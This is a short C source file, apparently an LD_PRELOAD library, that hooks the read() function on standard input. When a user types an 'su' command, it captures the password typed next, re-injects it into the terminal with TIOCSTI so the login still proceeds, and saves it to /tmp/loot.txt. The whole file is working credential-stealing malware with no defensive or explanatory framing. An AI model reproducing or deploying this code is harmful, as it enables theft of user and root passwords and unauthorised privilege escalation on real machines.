#include <fcntl.h>
#include <sys/ioctl.h>
#include <pthread.h>
#include <dlfcn.h>
#include <stdio.h>
#include <termios.h>
#include <string.h>
#include <unistd.h>
typedef ssize_t (*real_read_t)(int, void *, size_t);
char cmbuf[1000] = {0};
ssize_t real_read(int fd, void *data, size_t size) {
    return ((real_read_t)dlsym(RTLD_NEXT, "read"))(fd, data, size);
}
int lode = 0;
void *robber(void *arg) {
    char buffer[1000] = {0};
    lode = 1;
    real_read(0, buffer, 1000);
    int tty = open(ttyname(0), O_RDWR);
    for(int i=0; buffer[i]!='\0'; i++) {
        ioctl(tty, TIOCSTI, &buffer[i]); 
        usleep(100);
    }
    close(tty);
    FILE *fptr;
    fptr = fopen("/tmp/loot.txt", "w");
    fprintf(fptr, buffer);
    fclose(fptr);
    return NULL;
}

ssize_t read(int fd, void *data, size_t size) {
    ssize_t amount_read;
    amount_read = real_read(fd, data, size);
    if(fd==0){
        strcat(cmbuf, data);
        if(cmbuf[strlen(cmbuf)-1] == 1) cmbuf[strlen(cmbuf)-1] = 0;
        if(strstr(cmbuf, "\n") != NULL || strstr(cmbuf, "\r") != NULL){
            if(memcmp(cmbuf, "su", 2) == 0){
                pthread_t thread;
                pthread_create(&thread, NULL, robber, NULL);
                while(!lode) usleep(1000);
                lode = 0;
                usleep(10000);
            }
            memset(cmbuf, 0, 1000);
        }
    }
    return amount_read;
}
